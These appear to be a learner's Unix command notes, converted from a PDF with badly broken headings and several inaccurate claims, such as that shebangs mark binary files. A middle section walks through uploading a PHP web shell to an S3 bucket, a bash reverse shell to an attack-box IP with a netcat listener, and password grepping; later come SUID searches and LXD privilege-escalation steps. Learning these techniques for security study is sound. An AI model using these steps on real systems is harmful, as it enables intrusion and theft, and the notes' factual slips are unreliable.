# Unix Fundamentals

## Summary

shell that allows users to interact with a program. On BSD’ish Unix systems, Real TTY (/dev/ttyX),Actual virtual keyboard/screen pair. PTY (/dev/pts/X),Software-made fake TTY, pretending to be a keyboard/ screen. tmux inside TTY or PTY,Multiplexes shells inside your session without creating new keyboards.

## Table of Contents

  - [Unix Fundamentals](#unix-fundamentals)
  - [Using COMMAND LINE INTERFACE CLI - https://explainshell.com/](#using-command-line-interface-cli-httpsexplainshellcom)
  - [has expired or is otherwise invalid. This can happen if the key has been updated](#has-expired-or-is-otherwise-invalid-this-can-happen-if-the-key-has-been-updated)
  - [**Download the updated key**:](#download-the-updated-key)
  - [**Update and upgrade again**:](#update-and-upgrade-again)
  - [sudo apt full-upgrade -y](#sudo-apt-full-upgrade-y)
  - [#!/usr/bin/env python3](#usrbinenv-python3)
  - [(assuming that the interpreter is on the user’s PATH) at the beginning of the](#assuming-that-the-interpreter-is-on-the-users-path-at-the-beginning-of-the)
  - [script and giving the ﬁle an executable mode. The #! must be the ﬁrst two](#script-and-giving-the-ﬁle-an-executable-mode-the-must-be-the-ﬁrst-two)
  - [characters of the ﬁle. On some platforms, this ﬁrst line must end with a Unix-](#characters-of-the-ﬁle-on-some-platforms-this-ﬁrst-line-must-end-with-a-unix)
  - [On Windows systems, there is no notion of an “executable mode”. The Python](#on-windows-systems-there-is-no-notion-of-an-executable-mode-the-python)
  - [on a Python ﬁle will run it as a script. The extension can also be .pyw, in that](#on-a-python-ﬁle-will-run-it-as-a-script-the-extension-can-also-be-pyw-in-that)
  - [Sudo -l[l] [command]](#sudo-ll-command)
  - [forbidden) commands for the invoking user (or the user speciﬁed by the -U](#forbidden-commands-for-the-invoking-user-or-the-user-speciﬁed-by-the-u)
  - [option) on the current host. If a command is speciﬁed and is permitted by the](#option-on-the-current-host-if-a-command-is-speciﬁed-and-is-permitted-by-the)
  - [security policy, the fully-qualiﬁed path to the command is displayed along with](#security-policy-the-fully-qualiﬁed-path-to-the-command-is-displayed-along-with)
  - [any command line arguments.  If command is speciﬁed but not allowed, sudo will](#any-command-line-arguments-if-command-is-speciﬁed-but-not-allowed-sudo-will)
  - [as well as MacOS. Shell scripts are a sequence of bash commands within a ﬁle,](#as-well-as-macos-shell-scripts-are-a-sequence-of-bash-commands-within-a-ﬁle)
  - [combined together to achieve more complex tasks than simple one-liner and are](#combined-together-to-achieve-more-complex-tasks-than-simple-one-liner-and-are)
  - [*Please note that for variables to work you cannot leave a space between the](#please-note-that-for-variables-to-work-you-cannot-leave-a-space-between-the)
  - [We have to add a $ onto front of our variable name in order to use it. Just like](#we-have-to-add-a-onto-front-of-our-variable-name-in-order-to-use-it-just-like)
  - [Debugging is a very important part of programming so we should get used to](#debugging-is-a-very-important-part-of-programming-so-we-should-get-used-to)
  - [for the command and then the output of what that command executed. If there](#for-the-command-and-then-the-output-of-what-that-command-executed-if-there)
  - [was an error it would output a - on that line this makes it easy to spot where](#was-an-error-it-would-output-a-on-that-line-this-makes-it-easy-to-spot-where)
  - [you have gone wrong so you can ﬁx them. If you want to debug at a certain point](#you-have-gone-wrong-so-you-can-ﬁx-them-if-you-want-to-debug-at-a-certain-point)
  - [Line Interface), uploading a PHP shell to execute remote commands, and setting](#line-interface-uploading-a-php-shell-to-execute-remote-commands-and-setting)
  - [concepts explained:](#concepts-explained)
  - [on Linux using the command >> apt install awscli && aws conﬁgure](#on-linux-using-the-command-apt-install-awscli-aws-conﬁgure)
  - [### 3. **Setting Up a Reverse Shell**](#3-setting-up-a-reverse-shell)
  - [sudo python3 -m http.server 8000](#sudo-python3-m-httpserver-8000)
  - [Note: Whichever directory this command is called from, will be accessible over](#note-whichever-directory-this-command-is-called-from-will-be-accessible-over)
  - [which contains the reverse shell ﬁle/ common ﬁle we wish to Wget/Curl from](#which-contains-the-reverse-shell-ﬁle-common-ﬁle-we-wish-to-wgetcurl-from)
  - [Bash Script Execution: On the target machine, the bash script is executed. It](#bash-script-execution-on-the-target-machine-the-bash-script-is-executed-it)
  - [attempts to create a TCP connection back to the IP address and port speciﬁed](#attempts-to-create-a-tcp-connection-back-to-the-ip-address-and-port-speciﬁed)
  - [#!/bin/bash\n bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/Port# 0>&1](#binbashn-bash-i-devtcpyour_ip_addressport-01)
  - [>& /dev/tcp/<AttackBox_IP_ADDRESS>/port#: This part redirects the standard](#devtcpattackbox_ip_addressport-this-part-redirects-the-standard)
  - [to your machine where Netcat is listening. This allows you to control the target](#to-your-machine-where-netcat-is-listening-this-allows-you-to-control-the-target)
  - [Interaction with Netcat](#interaction-with-netcat)
  - [Reverse Shell Established: If the connection is successful, the interactive bash](#reverse-shell-established-if-the-connection-is-successful-the-interactive-bash)
  - [session from the target machine is piped through the TCP connection to your](#session-from-the-target-machine-is-piped-through-the-tcp-connection-to-your)
  - [### grep -ri 'passw' *](#grep-ri-passw)
  - [### cat * | grep -i passw*](#cat-grep-i-passw)
  - [cat * | grep -i passw* might generate errors if cat tries to read directories or](#cat-grep-i-passw-might-generate-errors-if-cat-tries-to-read-directories-or)
  - [grep processing](#grep-processing)
  - [In summary, `grep -ri 'passw' *` is more efﬁcient and reliable for searching](#in-summary-grep-ri-passw-is-more-efﬁcient-and-reliable-for-searching)
- [Find Command](#find-command)
  - [Searching the target system for important information, The built-in “ﬁnd”](#searching-the-target-system-for-important-information-the-built-in-ﬁnd)
  - [ﬁnd / -type d -name conﬁg: ﬁnd the directory named conﬁg under “/”](#ﬁnd-type-d-name-conﬁg-ﬁnd-the-directory-named-conﬁg-under)
  - [ﬁnd / -perm a=x: ﬁnd executable ﬁles](#ﬁnd-perm-ax-ﬁnd-executable-ﬁles)
  - [ﬁnd /home -user frank: ﬁnd all ﬁles for user “frank” under “/home”](#ﬁnd-home-user-frank-ﬁnd-all-ﬁles-for-user-frank-under-home)

---

## Content

### Unix Fundamentals

### Using COMMAND LINE INTERFACE CLI - https://explainshell.com/

### A command line interface (CLI) is a command screen or text interface called a

shell that allows users to interact with a program. On BSD’ish Unix systems,
Real TTY (/dev/ttyX),Actual virtual keyboard/screen pair. PTY (/dev/pts/X),Software-made fake TTY, pretending to be a keyboard/ screen. tmux inside TTY or PTY,Multiplexes shells inside your session without creating new keyboards.
### The error you're encountering indicates that the GPG key used by the repository

### has expired or is otherwise invalid. This can happen if the key has been updated

on the repository side but your local keyring hasn't been updated to match. To resolve this issue, you need to update the key for the Kali Linux repository. Here are the steps to do so:
### **Download the updated key**:

wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add -
### **Update and upgrade again**:

sudo apt update
### sudo apt full-upgrade -y

Python scripts can be made directly executable, like shell scripts, by putting the line
### #!/usr/bin/env python3

### (assuming that the interpreter is on the user’s PATH) at the beginning of the

### script and giving the ﬁle an executable mode. The #! must be the ﬁrst two

### characters of the ﬁle. On some platforms, this ﬁrst line must end with a Unix-

style line ending ('\n'), not a Windows ('\r\n') line ending. Note that the hash, or pound, character, '#', is used to start a comment in Python. The script can be given an executable mode, or permission, using the chmod command. $ chmod +x myscript.py
### On Windows systems, there is no notion of an “executable mode”. The Python

installer automatically associates .py files with python.exe so that a double-click
### on a Python ﬁle will run it as a script. The extension can also be .pyw, in that

case, the console window that normally appears is suppressed.
### Sudo -l[l] [command]

If no command is specified, the -l (list) option will list the allowed (and
### forbidden) commands for the invoking user (or the user speciﬁed by the -U

### option) on the current host. If a command is speciﬁed and is permitted by the

### security policy, the fully-qualiﬁed path to the command is displayed along with

### any command line arguments.  If command is speciﬁed but not allowed, sudo will

exit with a status value of 1. If the -l option is specified with an l argument (i.e. -ll), or if -l is specified multiple times, a longer list format is used. #!/bin/sh or #!/bin/zsh or #!/bin/bash signifies binary files What is bash? #!/bin/bash Bash is a scripting language that runs within the terminal on most Linux distros,
### as well as MacOS. Shell scripts are a sequence of bash commands within a ﬁle,

### combined together to achieve more complex tasks than simple one-liner and are

especially useful when it comes to automating sysadmin tasks such as backups.
### *Please note that for variables to work you cannot leave a space between the

variable name, the ”=” and the value when defined. They cannot have spaces in.
### We have to add a $ onto front of our variable name in order to use it. Just like

Javascript Template literals ${variableName} but without { }.
### Debugging is a very important part of programming so we should get used to

problem solving and fixing errors as early as possible. And bash has a few built in features that make our life simple. To debug syntax bash -x ./fileName.sh This tells you which lines are working and which lines are not (i.e it outputs a +
### for the command and then the output of what that command executed. If there

### was an error it would output a - on that line this makes it easy to spot where

### you have gone wrong so you can ﬁx them. If you want to debug at a certain point

you can insert set -x into your script and set +x to end the section. On command-line, we execute program or command by providing input/arguments to it. Also, output and error are displayed A command line.
### A process for interacting with an Amazon S3 bucket using the AWS CLI (Command

### Line Interface), uploading a PHP shell to execute remote commands, and setting

up a reverse shell using various utilities. Here's a breakdown of the steps and
### concepts explained:

### The ﬁles stored in the Amazon S3 bucket are called S3 objects. We can

interact with this S3 bucket with the aid of the awscli utility. It can be installed
### on Linux using the command >> apt install awscli && aws conﬁgure

### 1. **Interacting with Amazon S3 Buckets**
- **AWS CLI Installation on Linux:**
```bash apt install awscli && aws configure ```
### This command installs the AWS CLI and prompts you to conﬁgure it by

entering AWS credentials and default region.
- **Listing S3 Buckets:**
```bash aws --endpoint=http://s3.Server.AWS s3 ls ``` This lists all S3 buckets available at the specified endpoint.
- **Listing Objects in a Bucket:**
```bash aws --endpoint=http://s3.Server.AWS s3 ls s3://Server.AWS ``` ### 2. **Uploading and Executing a PHP Shell**
- **Creating a PHP Shell Script:**
```php echo '<?php system($_GET["cmd"]); ?>' > shell.php ``` This creates a simple PHP script that executes system commands passed as URL parameters.
- **Uploading the PHP Shell to S3:**
```bash aws --endpoint=http://s3.Server.AWS s3 cp shell.php s3://Server.AWS ```
- **Executing Commands via the Web Browser:**
``` http://Server.AWS/shell.php?cmd=id ``` Visiting this URL will execute the `id` command on the server where the PHP script is hosted.
### ### 3. **Setting Up a Reverse Shell**

- **Hosting a File Using Python HTTP Server:**
```bash sudo python3 -m http.server 8000 ``` Starting Up a Python Webserver
### sudo python3 -m http.server 8000

### Note: Whichever directory this command is called from, will be accessible over

the web on port specified. Default is 8000 for http. It is crucial to note here
### that this command for hosting the web server must be run from the directory

### which contains the reverse shell ﬁle/ common ﬁle we wish to Wget/Curl from

Target Machine. So, we must first traverse to the appropriate directory and then run the following command. ### 4. **Bash Reverse Shell Script:** ``` #!/bin/bash bash -i >& /dev/tcp/<AttackBox_IP_ADDRESS>/Port# 0>&1 ```
### Bash Script Execution: On the target machine, the bash script is executed. It

### attempts to create a TCP connection back to the IP address and port speciﬁed

(your listener). This script attempts to open a reverse shell connection to the specified IP address and port.
### #!/bin/bash\n bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/Port# 0>&1

This script attempts to open a reverse shell connection to the specified IP address and port. #!/bin/bash: This line is known as a shebang line, which tells the system this script should be run using Bash. bash -i: This initiates an interactive bash session.
### >& /dev/tcp/<AttackBox_IP_ADDRESS>/port#: This part redirects the standard

output (stdout) and standard error (stderr) to a TCP connection targeting <YOUR_IP_ADDRESS> on port 1337. 0>&1: This redirects the standard input (stdin) to where the standard output (stdout) is currently directed. ### 5. **Interaction with Netcat && Reverse Shell Connection:**
- **Netcat Command Explanation:**
```bash nc -lvnp [port#] ```
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: Numeric-only IP addresses
- `-p`: Specify listening port
### The target machine executes the bash script, creating a TCP connection back

### to your machine where Netcat is listening. This allows you to control the target

machine through the command line interface provided by the bash session.
### Interaction with Netcat

When you use the command nc -lvnp [port#], here’s what each option signifies: -l: Listen mode, for inbound connects. -v: Verbose, meaning it provides additional details.
-n: Numeric-only IP addresses, no DNS resolution.
-p [port#]: Specifies the port number on which to listen.
Netcat Listener: You set up Netcat to listen on a specific port on your machine. For example: This command sets up your machine to listen on port #.
### Reverse Shell Established: If the connection is successful, the interactive bash

### session from the target machine is piped through the TCP connection to your

listening Netcat session. This allows you to execute commands on the target machine via your Netcat terminal.
### ### grep -ri 'passw' *

- **Function**: Searches for the pattern "passw" in all ﬁles and directories
recursively starting from the current directory.
- **Options**:
- `-r`: Recursively searches subdirectories.
- `-i`: Ignores case (case insensitive search).
- **Behavior**: Skips over non-text ﬁles and handles directories by searching
their contents.
### ### cat * | grep -i passw*

- **Function**: Concatenates all ﬁles in the current directory into a single stream
and then searches this stream for the pattern "passw".
- **Options**:
- `-i`: Ignores case in `grep`.
- **Behavior**: Can cause errors if `cat` attempts to read directories or binary
files. The wildcard `*` after `passw` is treated as a literal character unless properly used in a regex. grep -ri 'passw' * will inherently handle directories and binary files without issue, skipping over directories and focusing only on readable text files.
### cat * | grep -i passw* might generate errors if cat tries to read directories or

special files that are not readable as text. These errors will appear before the
### grep processing

### In summary, `grep -ri 'passw' *` is more efﬁcient and reliable for searching

through files and directories, avoiding issues with non-text content and unnecessary concatenation of files.
## Find Command

### Searching the target system for important information, The built-in “ﬁnd”

command is useful and worth keeping in your arsenal. find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
### ﬁnd / -type d -name conﬁg: ﬁnd the directory named conﬁg under “/”

find / -type f -perm 0777: find files with the 777 permissions
### ﬁnd / -perm a=x: ﬁnd executable ﬁles

### ﬁnd /home -user frank: ﬁnd all ﬁles for user “frank” under “/home”

### ﬁnd / -mtime 10: ﬁnd ﬁles that were modiﬁed in the last 10 days

### ﬁnd / -atime 10: ﬁnd ﬁles that were accessed in the last 10 day

### ﬁnd / -cmin -60: ﬁnd ﬁles changed within the last hour (60 minutes)

### ﬁnd / -amin -60: ﬁnd ﬁles accesses within the last hour (60 minutes)

### ﬁnd / -size 50M: ﬁnd ﬁles with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.
### It is important to note that the “ﬁnd” command tends to generate errors

### which sometimes makes the output hard to read. This is why it would be wise

### to use the “ﬁnd” command with “-type f 2>/dev/null” for ﬁles &  for

directories “-type d 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).
### Folders and ﬁles that can be written to or executed from:

### ﬁnd / -writable -type d 2>/dev/null : Find world-writeable folders

### ﬁnd / -perm -222 -type d 2>/dev/null: Find world-writeable folders

### ﬁnd / -perm -o w -type d 2>/dev/null: Find world-writeable folders

### ﬁnd / -perm -o x -type d 2>/dev/null : Find world-executable folders

### ﬁnd / -perm -o r -type d 2>/dev/null : Find world-readable folders

### ﬁnd / -perm -u=s -type f 2>/dev/null: Find ﬁles with the SUID bit, which

allows us to run the file with a higher privilege level than the current user. Commonly noted as SUID (Set owner User ID), the special permission for the user access
### level has a single function: A ﬁle with SUID bit set always executes as the user

who owns the file, regardless of the user passing the command. If the file owner
### doesn't have

execute permissions, then use an uppercase S here. -type t >> True if the file is of the specified type. Possible file types are as follows:
### b       block special  c       character special  d       directory

f regular file l symbolic link p FIFO
### s       socket

### STRINGS -> The Linux "strings" command makes it possible to view the human-

### readable characters within any ﬁle. The main purpose of using the "strings"

command is to work out what type of file you're looking at, but you can also use
### it to extract text

### CHMOD - The chmod[change ﬁle/directory permission modiﬁcation] utility modiﬁes

### the ﬁle mode bits of the listed ﬁles as speciﬁed by the mode operand. It may

also be used to modify the Access Control Lists (ACLs) associated with the listed files.
### The permissions are grouped into 3 bits each. The ﬁrst 3 bits are user

permissions, then group permissions and then other permissions. I've added the pipe to make it easier to differentiate. Each character represent a different permission: r: readable
### w: writable

x: executable (basically an executable program) -: empty & d: directory The numerical representations are seen below: 4: read permission 2: write permission 1: execute permission
### Chown - The chown[change ﬁle/directory ownership] utility In addition to

### modifying permissions on ﬁles, you can also modify the group and user ownership

### of the ﬁle as well. Modify user ownership

### whatis - display the on-line manual descriptions

apropos - search the manual page names and descriptions man - format & display the on-line reference manuals pages
### which - locate a command

pushd/popd put working directory on a stack file determine file type locate find database
### updatedb update database for locate

### nano - command line text editor...can interpret & compile many programing

### languages. Takes an optional argument of ﬁleName.ﬁleExt, which can be used to

execute the file after the code has been saved. Bash & Zsh——>shell scripts don’t need an interpreter.
### ﬁle command is a standard program of Unix and Unix-like operating systems for

recognizing the type of data contained in a computer file.
### readlink – readlink [-fn] [ﬁle ...]

### DESCRIPTION The stat utility displays information about the ﬁle pointed to by

### ﬁle.  Read, write, or execute permissions of the named ﬁle are not required, but

all directories listed in the pathname leading to the file must be searchable. If no argument is given, stat displays information about the file descriptor for standard input.
### wget .  This command allows us to download ﬁles from the web via HTTP -- as if

### you were accessing the ﬁle in your browser. We simply need to provide the

address of the resource that we wish to download. grep command allows us to search the contents of files/ output of processes for specific values that we are looking for.
### ps -ax | grep <application name> —> This reveals running apps processes

### ping <send ICMP ECHO_REQUEST packets to network hosts> The ping command

### is used when we want to test whether a connection to a remote resource is

### possible. A handy secondary application for ping, as it can be used to determine

the IP address of the server hosting a website. Packets Transmitted via ICMP-
### echo-request(type—8)response(type-0)

Ping localhost or 127.0.0.1 can be used to resolve network issue arising from network card failure. Ping DomainName can be used to resolve internet domain name resolution issues
### arising from DNS

### NETSTAT  ===> Resolves and displays network statistic such as current network

### connections and port activities, The netstat command can be used with several

different options to gather information on existing connections. netstat -a: shows all listening ports and established connections. netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
### netstat -l: list ports in “listening” mode. These ports are open and ready to

accept incoming connections. This can be used with the “t” option to list only ports
### that are listening using the TCP protocol (below)

### netstat -s: list network usage statistics by protocol (below) This can also be

used with the -t or -u options to limit the output to a specific protocol. netstat -tp: list connections with the service name and PID information.
### netstat -i: Shows interface statistics. The netstat usage you will probably see

most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows; -a: Display all sockets -n: Do not resolve names -o: Display timers
## Ipconfig/Ifconfig/Ip A/Ip Addr/Arp -A

Time-to-live (TTL) is a value for the period of time that a packet, or data, should exist on a computer or network before being discarded. TTL is deployed as a
### counter or timestamp embedded in each packet. When the predeﬁned timespan or

event count expires, the packet is either discarded or revalidated. In networking, TTL prevents data packets from moving across the network indefinitely. In addition
### to limiting the lifespan of a data packet, TTL helps determine how long a packet

### has been in circulation and how long it will continue to move through the

network. This information provides the sender details about the packet's path through the internet.
### Start a tcpdump listener on your local machine using: “sudo tcpdump ip proto \

\icmp -i interfaceName” This starts a tcpdump listener, specifically listening for
### ICMP trafﬁc, which pings operate on. Whenever someone pings your system while

this command runs, it will reflect the ICMP echo request-response details.
### TRACEROUTE ===> Resolves Routes traveled by data packets from Local Networks

to the Internet, It gives much more information than a ping exe.
### The Internet is a large and complex aggregation of network hardware, connected

### together by gateways. Traceroute works by sending packets with a low TTL (time-

### to-live) in an attempt to elicit ICMP Time Exceeded messages from intermediate

### hops between the scanner and the target host.  Tracking the route one's packets

### follow (or ﬁnding the miscreant gateway that's discarding your packets) can be

difficult. traceroute utilizes the IP protocol `time to live' field and attempts to
### elicit an ICMP TIME_EXCEEDED response from each gateway along the path to

### some host. The basic syntax for traceroute on Linux is this: traceroute

<destination> By default, the Windows traceroute utility (tracert) operates using
### the same ICMP protocol that ping utilises, and the Unix equivalent operates over

UDP. This can be altered with switches in both instances.
### Whois essentially allows you to query who a domain name is registered to as well

as Registrar information. (Note: You may need to install whois before using it. On Debian based systems this can be done with sudo apt update && sudo apt-
### get install whois)

The whois utility looks up records in the databases maintained by several Network
### Information Centers (NICs). By default whois starts by querying the Internet

### Assigned Numbers Authority (IANA) whois server, and follows referrals to whois

### servers that have more speciﬁc details about the query name.  The IANA whois

server knows about IP address and AS numbers as well as domain names. NSlookup - Find the IP address of a domain name using nslookup, which stands
### for Name Server Look Up

### You need to issue the command nslookup DOMAIN_NAME, Or, more generally,

syntax {nslookup -type= DOMAIN_NAME SERVER}. These three main parameters are:
### OPTIONS contains the query type as shown in the table below. For instance,

you can use A for IPv4 addresses and AAAA for IPv6 addresses. DOMAIN_NAME is the domain name you are looking up.
### SERVER is the DNS server that you want to query. You can choose any local

### or public DNS server to query. Cloudﬂare offers 1.1.1.1 and 1.0.0.1, Google

offers 8.8.8.8 and 8.8.4.4, and Quad9 offers 9.9.9.9 and 149.112.112.112.
### Dig - DNS Information Groper is a DNS Lookup Utility allows us to manually

### query recursive DNS servers of our choice for information about domains, dig

(domain information groper) is a flexible tool for interrogating DNS name servers.
### It performs DNS lookups and displays the answers that are returned from the

### name server(s) that were queried, “Another interesting piece of information that

### dig gives us is the TTL (Time To Live) of the queried DNS record” - As mentioned

previously, when your computer queries a domain name, it stores the results in its
### local cache. The TTL of the record tells your computer when to stop considering

### the record as being valid -- i.e. when it should request the data again, rather

### than relying on the cached copy.. It's important to remember that TTL (in the

context of DNS caching) is measured in seconds.
### Syntax <dig @server name type> where:

### *server is the name or IP address of the name server to query. This can be an

### IPv4 address in dotted-decimal notation or an IPv6 address in colon-delimited

notation. When the supplied server argument is a hostname, dig resolves that name before querying that name server. *name is the name of the resource record that is to be looked up.
### *type indicates what type of query is required — ANY, A, MX, SIG, etc.  type can

be any valid query type. If no type argument is supplied, dig will perform a lookup for an A record.
### host - DNS lookup utility

### host [-aCdlnrsTwv] [-c class] [-N ndots] [-R number] [-t type] [-W wait]

[-m flag] [-4] [-6] [-v] [-V] {name} [server]
### DESCRIPTION

host is a simple utility for performing DNS lookups. It is normally used to convert
### names to IP addresses and vice versa. name is the domain name that is to be

looked up. It can also be a dotted-decimal IPv4 address or a colon-delimited IPv6
### address, in which case host will by default perform a reverse lookup for that

address. server is an optional argument which is either the name or IP address of the name server that host should query instead of the server or servers listed in /etc/resolv.conf.
### Source Code(Text-Based Scripts) —> Compilers(i.e GNU) —> Binary Script

CHANGING FILE PERMISSIONS (RWX<—> Read-Write-Execute)
chmod - change file modes/permission or Access Control Lists btw root/User/ Group/Admin
### Syntax chmod +perm ﬁleName or chmod -perm ﬁleName where perm is

permissions(r=read, w=write, x=executable) + to add permissions - to remove permissions chown - change
## Killing Programs And Logging Out

### System Daemon systemd (i.e Launch Daemon launchd in the case of MACos) is

### one of the ﬁrst processes that are started. Any program or piece of software

that we want to start will start as what's known as a child process of systemd.
### This means that it is controlled by systemd, but will run as its own process

(although sharing the resources from systemd) to make it easier for us to identify and the likes.
### The Operating System (OS) uses namespaces to ultimately split up the resources

### available on the computer to (such as CPU, RAM and priority) processes,

### Namespaces are great for security as it is a way of isolating processes from

another -- only those that are in the same namespace will be able to see each other.
### systemctl -- this command allows us to interact with the systemd process/

### daemon. Continuing on with our example, systemctl is an easy to use command

that takes the following formatting: systemctl [option] [service] >>i.e option is
### start, stop, enable (enable process on startup), disable (disable processes that

where previously enabled on startup). The equivalent to Linux systemctl on macOS
### would be launchctl

PS utility displays a header line, followed by lines containing information about all of your processes that have controlling terminals.
### Processes are the programs that are running on your machine. They are managed

### by the kernel, where each process will have an ID associated with it, also known

as its PID. The PID increments for the order In which the process starts. I.e. the 60th process will have a PID of 60.
### We can use the friendly ps command to provide a list of the running processes as

### our user's session and some additional information such as its status code, the

### session that is running it, how much usage time of the CPU it is using, and the

### name of the actual program or command that is being executed

TOP program periodically displays a sorted list of system processes., The default sorting key is pid, but other keys can be used instead. Various output options are
### available. Another very useful command is the top command; top gives you real-

time statistics about the processes running on your system instead of a one-time
### view. These statistics will refresh every 10 seconds, but will also refresh when

### you use the arrow keys to browse the various rows

### LXD is a management API for dealing with LXC containers on Linux systems. It

### will perform tasks for any members of the local lxd group. It does not make an

effort to match the permissions of the calling user to the function it is asked to perform. A member of the local “lxd” group can instantly escalate the privileges
### to root on the

host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even
### with the LXD snap package. https://book.hacktricks.wiki/en/linux-hardening/

### privilege-escalation/interesting-groups-linux-pe/lxd-privilege-

### escalation.html#lxdlxc-group---privilege-escalation https://

www.hackingarticles.in/lxd-privilege-escalation/ The exploit works by making use of the Alpine image, which is a lightweight Linux
### distribution based on busy box. After this distribution is downloaded and built

### locally, an HTTP server is used to upload it to the remote system. The image is

then imported into LXD and it is used to mount the Host file system with root privileges.
### Building the image locally can be tedious due to dependency errors and other

### challenges. To simplify the process, we recommend downloading pre-built Alpine

image files from the official LXC containers repository.
### Steps to be performed on the attacker machine:

Download build-alpine in your local machine through the git repository.
### Execute the script “build -alpine” that will build the latest Alpine image as a

compressed file, this step must be executed by the root user.
### Transfer the tar ﬁle to the host machine

Steps to be performed on the host machine: Download the alpine image
### Import image for lxd

Initialize the image inside a new container.
### Mount the container inside the /root directory

Backgrounding and Foregrounding in Linux & An Introduction to Shell Operators
### This operator allows you to run commands in the background of your

### terminal, sufﬁxing a command with & operator. We can use Ctrl + Z on our

keyboard to background a process. It is also an effective way of "pausing" the
execution of a script or command.
### With our process backgrounded using either Ctrl + Z or the & operator, we can

### use fg to bring this back to focus like below, where we can see the fg command

### is being used to bring the background process back into use on the terminal,

where the output of the script or command is now returned to us. This operator allows you to combine multiple commands together in one line of your terminal.
### This operator is a redirector - meaning that we can take the output from a

command (such as using cat to output a file) and direct it elsewhere.
### This operator is an appender - This operator does the same function of the

> operator but appends the output rather than replacing (meaning nothing is overwritten).
### | pipe Pipes allow separate processes to communicate without having been

designed explicitly to work together. This allows tools quite narrow in their function to be combined in complex ways. “unnamed pipe” The pipe exists only inside the kernel and cannot be accessed by
### processes that created it

### “named pipe”, which is sometimes called a FIFO. FIFO stands for “First In, First

### Out” and refers to the property that the order of bytes going in is the same

coming out. The “name” of a named pipe is actually a file name within the file system. In Unix-like operating systems, the redirection operators { > } are used to control
### where output from commands is sent (stdout and stderr) and where commands

### get their input from (stdin). Here's an explanation of each: Understanding

redirection operators in Unix-like systems can be simplified by visualizing them as
### a way to manage where data ﬂows during the execution of commands. Redirection

### is essentially instructing the shell to change the default data ﬂow from or to

### these streams. When you use redirection operators, you're telling the system to

take the output or input from one place and send it somewhere else, such as a file or another stream.
### ### Standard File Descriptors Number

Standard Input (stdin): This is represented by file descriptor 0. It's the default
### stream for input data into commands. - **0**: stdin (standard input)

### Standard Output (stdout): Represented by ﬁle descriptor 1, this is the default

### stream where commands send their output. - **1**: stdout (standard output)

Standard Error (stderr): This is file descriptor 2, used by commands to send error
### messages. - **2**: stderr (standard error)

Imagine you have three mailboxes labeled "Input", "Output", and "Errors". By default: People put requests in your "Input" mailbox.
You drop your responses into the "Output" mailbox. Any complaints or issues you encounter go into the "Errors" mailbox. ### Redirection Operators
### Let's break down the n>&m syntax:

### n: This represents the ﬁle descriptor you want to redirect. For example, if you

want to redirect stderr, you would use 2. m: This is the target file descriptor where you want the output to go. If you want to send stderr to the same place as stdout, you would use 1. If n is omitted, it defaults to 1 (stdout), because sending output is the most common form of redirection.
### For example:

>& This operator is used to redirect output from one file descriptor to another. It can redirect both stdout and stderr to a file or another output stream. >&2 Redirects stdout to stderr.
### 2>&1 Redirects stderr to where stdout is currently going.\

2> Redirects stderr to a file, similar to how > redirects stdout. &> Redirects both stdout and stderr to a file. 0>&1 This redirects stdin (`0`) to wherever stdout (`1`) is currently directed. It's
### often used in shell scripts and command lines to ensure that input is taken from

the same source as the output destination. >&2 This redirects stdout to stderr. It's useful when you want all output, including
### standard output and error messages, to be sent to the error stream. When

### running a script where you want all outputs, both regular and error messages,

logged into an error log file, you might redirect stdout to stderr and then redirect stderr to a file. <> Opens a file for reading and writing on stdin.
### These redirections are fundamental for managing process input and output in

scripts and command-line operations, allowing for sophisticated control over where data is sent and received.
### Automated J0b Execution

Crontab is one of the processes that is started during boot, which is responsible
### for facilitating and managing cron jobs. A crontab is simply a special ﬁle with

### formatting that is recognised by the cron process to execute each line step-by-

### step. Crontabs require 6 speciﬁc values: The syntax of each line expects a cron

expression made of five fields which represent the time to execute the command, followed by a shell command to execute. Value Description MIN What minute to execute at HOUR What hour to execute at
DOMWhat day of the month to execute at MONWhat month of the year to execute at DOW
### What day of the week to execute at

CMD The actual command that will be executed.
### @reboot conﬁgures a job to run once when the daemon is started. Since cron is

typically never restarted, this typically corresponds to the machine being booted.
### This behavior is enforced in some variations of cron, such as that provided in

Debian,[10] so that simply restarting the daemon does not re-run @reboot jobs.
### @reboot can be useful if there is a need to start up a server or daemon under a

particular user, and the user does not have access to configure init to start the program.
### The actions of cron are driven by a crontab (cron table) ﬁle, a conﬁguration ﬁle

that specifies shell commands to run periodically on a given schedule. The crontab files are stored where the lists of jobs and other instructions to the cron daemon
### are kept. Users can have their own individual crontab ﬁles and often there is a

system-wide crontab file (usually in /etc/crontab or a subdirectory of /etc e.g. /
### etc/cron.d) that only system administrators can edit. Crontabs can be edited by

### using crontab -e, where you can select an editor (such as Nano) to edit your

### crontab. An interesting feature of crontabs is that these also support the

### wildcard or asterisk (*). If we do not wish to provide a value for that speciﬁc

### ﬁeld, i.e. we don't care what month, day, or year it is executed

Each line of a crontab file represents a job, and looks like this: # ┌───────────── minute (0 - 59)
### # │ ┌───────────── hour (0 - 23)

# │ │ ┌───────────── day of the month (1 - 31)
### # │ │ │ ┌───────────── month (1 - 12)

# │ │ │ │ ┌───────────── day of the week (0 - 6) (Sunday to
Saturday; # │ │ │ │ │ 7 is also Sunday on some systems) # │ │ │ │ │ # │ │ │ │ │ # * * * * * <command to execute> # m h dom mon dow <command> Cron permissions
### These two ﬁles play an important role:

/etc/cron.allow - If this file exists, it must contain the user's name for that user to be allowed to use cron jobs.
### /etc/cron.deny - If the cron.allow ﬁle does not exist but the /etc/cron.deny ﬁle

does exist then, to use cron jobs, users must not be listed in the /etc/cron.deny
file.
### Note that if neither of these ﬁles exists then, depending on site-dependent

configuration parameters, either only the super user can use cron jobs, or all users can use cron jobs.
### The main purpose of introducing Kali Undercover mode is to prevent any

unnecessary attention while using Kali Linux in public. Kali Undercover is a set of
### scripts that changes the look and feel of your Kali Linux desktop environment to

Windows 10 desktop environment, like magic. *Run this Command ====> kali-undercover
### Installing Packages

